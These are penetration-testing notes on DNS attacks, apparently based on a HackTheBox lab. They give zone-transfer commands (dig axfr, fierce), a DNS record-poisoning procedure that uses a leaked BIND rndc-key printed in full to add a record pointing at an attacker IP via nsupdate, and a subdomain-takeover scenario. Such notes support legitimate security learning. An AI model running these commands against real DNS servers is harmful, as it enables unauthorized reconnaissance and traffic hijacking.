DNS - Domain Name Server (TCP/53)

A Domain Name System (DNS) turns domain names into IP addresses, which allow browsers to get to websites and other internet resources.

A little bit of theory of different DNS records

A records: We recognize the IP addresses that point to a specific (sub)domain through the A record. Here we only see one that we already know.

MX records: The mail server records show us which mail server is responsible for managing the emails for the company. Since this is handled by google in our case, we should note this and skip it for now.

NS records: These kinds of records show which name servers are used to resolve the FQDN to IP addresses. Most hosting providers use their own name servers, making it easier to identify the hosting provider.

TXT records: this type of record often contains verification keys for different third-party providers and other security aspects of DNS, such as SPF, DMARC, and DKIM, which are responsible for verifying and confirming the origin of the emails sent. Here we can already see some valuable information if we look closer at the results.

    DNS zone transfer attack

      DNS is configured to be able to tranfer domain names to other domain name servers. This may be done due reduce load or to sync data

      Here you can see diferent examples to perform the attack

      When performing this attack remember to do it again for the subdomains

      dig axfr @DNS_IP #Try zone transfer without domain
      dig axfr @DNS_IP DOMAIN #Try zone transfer guessing the domain
      fierce --domain DOMAIN --dns-servers DNS_IP #Will try toperform a zone transfer against every authoritative name server and if this doesn'twork, will launch a dictionary attack

    DNZ zone update

      This attack consits in updating the DNS records in order to setup domains which were not there. But to do so there are certain requisites which must be fullfiled

      First of all we need to check the following file. This can be done using Local File Inclusion attack or in case you found any export of the file or other

      Second we must ensure that the DNS server we are attacking uses bind

      /etc/bind/named.conf.options

      Inside this file we will find the following

      include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};

      To have it clear the rndc-key which is an authentication key used by bind (the DNS server) in order to allow the secure communication between the RNDC (Remote Name Deamon Control) which allows the remote administration of the DNS server

      If we keep looking at the included files we can read the named.conf.local which shows the following content

      zone "snoopy.htb" IN {
    type master;
    file "/var/lib/bind/db.snoopy.htb";
    allow-update { key "rndc-key"; };
    allow-transfer { 10.0.0.0/8; };
};

      The important part here is the allow-update { key "rndc-key"; } parameter which as it is stablished it allow us to perform changes in the DNS records providing the RNDC key

      To exploit this we need to create a file when we load the configuration. As we can see in this case we are adding the domain mail.snoopy.htb

      server #VICTIM_IP
zone snoopy.htb
update add mail.snoopy.htb 86400 IN A #ATTACKER_IP
send

      And another file with the RNDC key. Just as following

      key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};

      Finally use the following command in order to update the DNS records

      nsupdate -k rndc.key poison_dns.txt
      Now with the DNS record added we could be able to make work certain part of a website which was not loading since it was requesting a domain that was not setup

    Subdomain takeover

      Let's supose the following situation:

      A company has a external resource which is linked to a subdomain called blog.mycompany.com. This can be configured in the CNAME property of the DNS.

      In case this external resource becomes unavailable an attacker could create a new resource with the same domain and put it's own page

      Since the DNS of our company is still configured with the CNAME it will detect that the resource is now available and will resolve the attacker website
